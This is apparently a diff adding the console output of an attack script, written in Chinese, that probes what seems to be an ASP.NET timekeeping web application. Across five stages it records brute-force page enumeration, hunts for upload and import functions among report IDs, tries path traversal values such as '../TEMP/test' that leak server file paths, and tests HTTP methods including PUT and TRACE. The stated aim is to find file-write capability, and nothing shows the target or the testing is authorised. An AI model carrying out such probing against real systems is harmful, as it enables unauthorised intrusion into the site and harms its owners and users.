@@ -1,0 +1,72 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎯 终极目标：寻找文件操作功能
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[阶段1] 暴力枚举所有可能的文件操作页面
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  生成字典: 45 个页面
+
+  开始暴力枚举...
+
+ULTIMATE_FILE_OPERATION_HUNT.sh: line 97: found_pages.txt: No such file or directory
+  发现页面: 0 个
+
+[阶段2] 深度分析已知页面的隐藏功能
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  获取完整菜单...
+  提取所有交互元素...
+  发现交互: 6
+
+  搜索文件操作关键词...
+javascript:skm_closeSubMenus(document.getElementById(&#39;Menu1&#39;));window.open(&#39;chamcong/TaoBCC_To.aspx&#39;,&#39;right&#39;);
+
+[阶段3] 测试所有报表ID寻找导入功能
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  测试 22 个报表ID...
+  🔥 ID=IMPORT: 可能有导入功能 (4407 bytes)
+     按钮: btnIn
+     按钮: btnExport
+  🔥 ID=UPLOAD: 可能有导入功能 (4407 bytes)
+     按钮: btnIn
+     按钮: btnExport
+  🔥 ID=NHAP: 可能有导入功能 (4401 bytes)
+     按钮: btnIn
+     按钮: btnExport
+
+[阶段4] 尝试通过现有功能创建目录
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  策略：利用路径遍历创建父目录
+
+  尝试1: 路径 = 'TEMP/test'
+    结果: Could not find a part of the path 'C:\TEMP\TEMP\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.</title>
+
+  尝试2: 路径 = 'C:/TEMP/test'
+    结果: 
+
+  尝试3: 路径 = '../TEMP/test' (从chamcong向上)
+    结果: Could not find a part of the path 'C:\TEMP\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.</title>
+
+[阶段5] HTTP方法篡改寻找隐藏功能
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  测试 PUT 方法...
+    状态: 411, 大小: 348 bytes
+    🔥 可能支持 PUT 方法！
+
+  测试 DELETE 方法...
+    状态: 405, 大小: 1297 bytes
+
+  测试 OPTIONS 方法...
+    状态: 200, 大小: 4 bytes
+    🔥 可能支持 OPTIONS 方法！
+
+  测试 TRACE 方法...
+    状态: 501, 大小: 1512 bytes
+    🔥 可能支持 TRACE 方法！
+
+  测试 PROPFIND 方法...
+    状态: 405, 大小: 1297 bytes
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ 阶段1-5完成，继续深度搜索...
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
